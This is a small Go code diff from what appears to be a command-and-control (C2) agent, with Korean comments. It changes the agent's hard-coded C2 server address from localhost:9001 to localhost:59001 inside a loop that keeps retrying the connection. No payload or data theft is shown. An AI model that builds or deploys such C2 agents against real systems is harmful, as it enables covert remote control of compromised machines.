@@ -68,7 +68,7 @@ func handleAgentConnection(conn net.Conn) {
 
 // agentMain 함수는 에이전트의 주요 로직을 포함하며, 서버에 지속적으로 연결을 시도합니다.
 func agentMain() {
-	serverAddress := "localhost:9001" // C2 서버 주소
+	serverAddress := "localhost:59001" // C2 서버 주소
 
 	for {
 		fmt.Printf("Attempting to connect to server at %s...\n", serverAddress)
